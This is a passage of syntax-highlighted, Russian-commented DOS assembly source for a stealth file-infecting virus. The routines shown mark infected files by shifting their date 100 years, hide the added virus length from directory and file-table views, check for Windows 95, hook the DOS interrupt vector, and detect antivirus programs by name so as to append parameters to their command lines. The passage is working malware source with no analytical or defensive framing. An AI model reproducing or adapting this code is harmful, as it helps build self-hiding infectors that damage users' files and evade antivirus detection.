        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1857h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">stacks</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fvinfect</span><span class="sc0">

 </span><span class="sc5">fverror</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Open/Close SFT - подпрограмма для закрытия/открытия нормальной SFT</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">OpenSFT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; "Open"</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Manipulate</span><span class="sc0">

 </span><span class="sc5">CloseSFT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; "Close"</span><span class="sc0">

 </span><span class="sc5">Manipulate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; сохранение handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HandleCheck</span><span class="sc0">     </span><span class="sc1">; проверка, это файл или chardevice</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SFT_Error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">        </span><span class="sc1">; получение JFT для этого файла</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SFT_Error</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; BL = System file entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SFT_Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">        </span><span class="sc1">; получение адреса SFT в ES:DI</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SFT_Error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; восстановление handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; проверка инфицированности файла</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">SFT_Error</span><span class="sc0">       </span><span class="sc1">; выход в случае чистого файла</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; "Open"?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">open</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">open</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; сохранение в SFT размера</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; получение даты файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">         </span><span class="sc1">; скрытие лишних 100 лет</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; "Open"?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">clsft</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; увеличение даты файла</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">clsft</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; сохранение измененной даты</span><span class="sc0">

 </span><span class="sc5">SFT_Error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; проверка активности Win95 (используя WinOldAp)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">WinOldAp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1700h</span><span class="sc0">        </span><span class="sc1">; функция WinOldAp Installation Check</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">             </span><span class="sc1">; программа, которая присутствует в Win95</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; в 32-разрядном PE режиме</span><span class="sc0">

 </span><span class="sc5">get_dup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; загрузка регистров ES:BX оригинальным</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; вектором 21-го прерывания</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">set_dup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; сохранение ES:BX в 63-й векторе</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; прерывания</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">chk_dup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; проверка изменение 63-го вектора</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; прерывания</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21p</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; size stealth</span><span class="sc0">
</span><span class="sc1">; ES:SI -&gt; Дата файла</span><span class="sc0">
</span><span class="sc1">; ES:DI -&gt; Длина файла</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">sizst</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; dx = дата файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">         </span><span class="sc1">; маскировка и проверка 100 лишних лет</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">oklen</span><span class="sc0">           </span><span class="sc1">; файл инфицирован?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; установить нормальную дату файла</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc1">; маскировка приращения длины файла</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">oklen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">hidestm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; сохранить дату в стеке</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; получить год файла</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">          </span><span class="sc1">; сравнение его с 100</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; восстановить дату</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">okinf</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; получить год файла</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">          </span><span class="sc1">; спрятать лишнее</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; файл заражен!</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">okinf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">correctdate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; установка даты файла в зависимости</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; от того, заражен ли он</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideStm</span><span class="sc0">         </span><span class="sc1">; нормальная дата</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; проверить файл на зараженность</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">okdat</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">okdat</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">; установка откорректированной</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; даты файла</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Проверка имени файла (AVs и цифры)</span><span class="sc0">
</span><span class="sc1">; Проверка расширения файла (Extens)</span><span class="sc0">
</span><span class="sc1">; При SAVE_AX=4B00 добавление параметров в cmdline</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">Filename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; смещение имени в индексный регистр</span><span class="sc0">
 </span><span class="sc5">nfind</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; поиск имени файла</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">          </span><span class="sc1">; в нашем случае оно будет следовать</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">separ</span><span class="sc0">           </span><span class="sc1">; за последним "/", "\", ":"</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">separ</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">store</span><span class="sc0">
 </span><span class="sc5">separ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; сохранить смещение</span><span class="sc0">

 </span><span class="sc5">store</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; проверка конца строки (0)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nfind</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; SI -&gt; имя файла</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; расширение пока не найдено</span><span class="sc0">
 </span><span class="sc5">gext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; расширение?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gext</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; если точек в имнеи файла</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Bad_File</span><span class="sc0">        </span><span class="sc1">; обнаружено не было</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; сейчас BP-расширение файла, DX-его имя</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; ES=CS</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_add</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; SI -&gt; имя файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">prms</span><span class="sc0">         </span><span class="sc1">; табличка (формат: avname,0,0,cmdline,0dh)</span><span class="sc0">

 </span><span class="sc5">scancmd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; сравнение имени запускаемой программы</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">addprm</span><span class="sc0">          </span><span class="sc1">; с предусмотренным именем из таблицы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">b</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; конец таблицы?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">scancmd</span><span class="sc0">         </span><span class="sc1">; в таблице имя не найдено - запущена</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_add</span><span class="sc0">          </span><span class="sc1">; другая программа</span><span class="sc0">

 </span><span class="sc5">addprm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; сохранение ES</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">d</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_bx</span><span class="sc0"> </span><span class="sc1">; загрузка в ES:BX адреса EPB</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; загрузка адреса командной строки в ES:BX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc5">getdx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; сканируем командную строку</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">b</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0dh</span><span class="sc0">   </span><span class="sc1">; конец строки?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">getdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; счетчик длины дополнительного параметра</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc5">b</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; загрузка байта параметра</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; сохранение байта параметра</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; увеличение счетчика</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">          </span><span class="sc1">; проверка на окончание параметра</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; увеличение длины командной строки</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; восстановление ES</span><span class="sc0">

 </span><span class="sc5">no_add</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
